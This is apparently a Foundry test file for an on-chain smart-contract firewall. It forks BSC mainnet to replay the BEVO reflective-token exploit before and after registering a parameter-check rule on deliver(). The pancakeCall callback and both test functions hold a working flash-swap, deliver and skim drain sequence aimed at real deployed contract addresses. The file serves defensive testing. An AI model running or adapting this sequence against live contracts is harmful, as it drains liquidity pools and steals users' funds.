import {Test, console} from "../lib/forge-std/src/Test.sol";
import {FireWallRouter} from "../src/Implemention/Router.sol";
import {FireWallRegistry} from "../src/Implemention/Registry.sol";
import {IModule} from "../src/Implemention/Interface/IModule.sol";
import {AuthModule} from "../src/Implemention/AuthenticationModule.sol";
import {TestContract} from "../src/example/test_contract.sol";
import {CoinToken} from "../src/example/testCoinToken.sol";
import {ParamCheckModule} from "../src/Implemention/ParamCheckModule.sol";

//============================== proxy =============================
import {ProxyForRegistry} from "../src/proxy/proxyForRegistry.sol";
import {FireWallRegistryV2} from "../src/Implemention/RegistryV2.sol";
import {ProxyForRouter} from "../src/proxy/proxyForRouter.sol";
import {FireWallRouterV2} from "../src/Implemention/RouterV2.sol";
import {SimpleSwap} from "../src/example/testFireWallexp.sol";
import "../src/Implemention/Interface/interface.sol";
// import "../out/testCoinToken.sol/CoinToken.json";

import "../src/proxy/utils/StorageSlot.sol";
import "../src/proxy/utils/Address.sol";

contract TestFireWallThroughOnChainAttack is Test {
    //==============================================firewall================================================
    address deployer = vm.addr(1);
    address auth_manager = vm.addr(2);
    address param_manager = vm.addr(3);
    address projectManager = vm.addr(4);
    address black = vm.addr(5);
    address admin = vm.addr(6);

    FireWallRegistry registry;
    ProxyForRegistry proxyForRegistry;
    FireWallRouter router;
    ProxyForRouter proxyForRouter;
    AuthModule authModule;
    TestContract testContract;
    // SimpleSwap testContract;
    ParamCheckModule paramModule;

    //============================================reflective token===============================================
    IERC20 private constant wbnb =
        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    // reflectiveERC20 private constant bevo = reflectiveERC20(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);
    CoinToken bevo = CoinToken(0xc6Cb12df4520B7Bf83f64C79c585b8462e18B6Aa);

    IUniswapV2Pair private constant wbnb_usdc =
        IUniswapV2Pair(0xd99c7F6C65857AC913a8f880A4cb84032AB2FC5b);
    IUniswapV2Pair private constant bevo_wbnb =
        IUniswapV2Pair(0xA6eB184a4b8881C0a4F7F12bBF682FD31De7a633);
    IPancakeRouter private constant pancakeRouter =
        IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address tester = vm.addr(1);

    // TODO:整理一下复现的思路：1.在本地创建一个bevo 2.将本地的bevo的状态设置为与链上的bevo合约一致(但是我觉的很难，所以我觉的能将资金设置成一样就够了)
    // 3.创建对应的pair(本地bevo与wbnb) 4.要保证这个pair中的两种代币的金额与链上的一致
    function setUp() public {
        cheats.createSelectFork("bsc", 25_230_702);
        // fork and label
        cheats.createSelectFork("bsc", 25_230_702);
        cheats.label(address(wbnb), "WBNB");
        cheats.label(address(bevo), "BEVO");
        cheats.label(address(wbnb_usdc), "PancakePair: WBNB-USDC");
        cheats.label(address(bevo_wbnb), "PancakePair: BEVO-WBNB");
        cheats.label(address(pancakeRouter), "PancakeRouter");

        vm.startPrank(deployer, deployer);
        console.log("deployer %s", deployer);
        // ============================= deploy registry and router =============================
        registry = new FireWallRegistry();
        bytes memory InitData_Registry = abi.encodeWithSignature(
            "initialize(address)",
            deployer
        );
        proxyForRegistry = new ProxyForRegistry(
            address(registry),
            admin,
            InitData_Registry
        );
        router = new FireWallRouter();
        bytes memory InitData_Router = abi.encodeWithSignature(
            "initialize(address,address)",
            address(proxyForRegistry),
            deployer
        );
        proxyForRouter = new ProxyForRouter(
            address(router),
            admin,
            InitData_Router
        );
        console.log("proxyForRouter's address is:",address(proxyForRouter));

        // ============================= deploy modules through proxy =============================
        // 部署param模块
        paramModule = new ParamCheckModule(
            address(proxyForRouter),
            address(proxyForRegistry)
        );
        bytes memory addModuledata1 = abi.encodeWithSignature(
            "addModule(address,address,string,bool)",
            address(paramModule),
            param_manager,
            "param detect",
            true
        );
        proxyForRegistry.CallOn(addModuledata1);
        // (bool success, ) = address(proxyForRegistry).call(addModuledata1);
        // 部署黑名单模块
        authModule = new AuthModule(
            address(proxyForRouter),
            address(proxyForRegistry)
        );
        bytes memory addModuledata2 = abi.encodeWithSignature(
            "addModule(address,address,string,bool)",
            address(authModule),
            auth_manager,
            "black detect",
            true
        );
        proxyForRegistry.CallOn(addModuledata2);

    }

    // 回调函数
    function pancakeCall(
        address /*sender*/,
        uint256 /*amount0*/,
        uint256 /*amount1*/,
        bytes calldata /*data*/
    ) external {
        vm.startPrank(address(this),address(this));
        address[] memory path = new address[](2);
        path[0] = address(wbnb);
        path[1] = address(bevo);
        //3.use loan to swap bevo
        // The current number of tokens in the contract is: 192 WBNB
        pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            wbnb.balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );
        // =====================================================
        console.log("++++++++++++++++++++++++++++++++++++");
        console.log(
            "after first swap, the this balance of bevo:",
            bevo.balanceOf(address(this))
        );
        bevo.deliver(bevo.balanceOf(address(this)));
        bevo_wbnb.skim(address(this));
        bevo.deliver(bevo.balanceOf(address(this)));
        emit log_named_decimal_uint(
            "now after two time deliver,the bevo balance of pair:",
            bevo.balanceOf(address(bevo_wbnb)),
            18
        );
        bevo_wbnb.swap(337 ether, 0, address(this), "");
        wbnb.transfer(address(wbnb_usdc), 193 ether);
        console.log("++++++++++++++++++++++++++++++++++++");
    }

    function testOnchainAttackBeforeUseFireWall() public {
        console.log("==========================================");
        console.log("start attack");
        emit log_named_decimal_uint(
            "WBNB balance before exploit",
            wbnb.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "BEVO balance before exploit",
            bevo.balanceOf(address(this)),
            18
        );
        // Attack
        //1.First approve Pancake router
        vm.startPrank(address(this));
        wbnb.approve(address(pancakeRouter), type(uint256).max);
        //2.swap-flashloan
        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "This contract WBNB balance after exploit",
            wbnb.balanceOf(address(this)),
            18
        );
    }

    function testOnchainAttackAfterUseFireWall() public {
        // prepare
        // bytes memory bytecodeWithFireWall = vm.getDeployedCode("testCoinToken.sol:CoinToken");
        // vm.etch(address(bevo), bytecodeWithFireWall);

        // // ========================deploy and registry test contract=====================
        // vm.startPrank(deployer, deployer);
        // // 注册信息
        // string[] memory params = new string[](1);
        // params[0] = "uint256";
        // address[] memory enableModules = new address[](2);
        // enableModules[0] = address(paramModule);
        // enableModules[1] = address(authModule);
        string[] memory params = new string[](1);
        params[0] = "uint256";
        address[] memory enableModules = new address[](2);
        enableModules[0] = 0x178Fc46a6417532E58cF132cCFC2Ef874af6FBCA;
        enableModules[1] = 0xe7C87c3E40e1a1F580C33A3B87d07379d141b47A;
        // 注册
        bytes memory registryData = abi.encodeWithSignature(
            "register(address,address,bytes4,string[],address[])",
            address(bevo),
            0xE03864F2673Ac19F9dB8512Cceb692817Cb1095E,
            bevo.deliver.selector,
            params,
            enableModules
        );
        proxyForRegistry.CallOn(registryData);
        vm.stopPrank();
        //黑名单拦截1
        // bytes memory auth_data = abi.encode(
        //     address(bevo),
        //     true,
        //     bevo.deliver.selector,
        //     address(this),
        //     true,
        //     true
        // );
        // bytes memory authUpdateData = abi.encodeWithSignature(
        //     "updataModuleInfo(address,bytes)",
        //     address(authModule),
        //     auth_data
        // );
        // vm.prank(deployer);
        // proxyForRegistry.CallOn(authUpdateData);

        //参数拦截
        bytes memory data = abi.encode(
            address(bevo),
            bevo.deliver.selector,
            0,
            3028267986646483922,
            3028267986646483924,
            false
        );
        bytes memory paramUpdataData = abi.encodeWithSignature(
            "updataModuleInfo(address,bytes)",
            address(paramModule),
            data
        );
        vm.prank(deployer);
        proxyForRegistry.CallOn(paramUpdataData);

       console.log("=============================================");
       console.log("start attack");
        emit log_named_decimal_uint(
            "WBNB balance before exploit",
            wbnb.balanceOf(address(this)),
            18
        );
        emit log_named_decimal_uint(
            "BEVO balance before exploit",
            bevo.balanceOf(address(this)),
            18
        );
        // Attack
        //1.First approve Pancake router
        vm.startPrank(address(this));
        wbnb.approve(address(pancakeRouter), type(uint256).max);
        //2.swap-flashloan
        wbnb_usdc.swap(0, 192.5 ether, address(this), new bytes(1));
        emit log_named_decimal_uint(
            "This contract WBNB balance after exploit",
            wbnb.balanceOf(address(this)),
            18
        );

    }
}
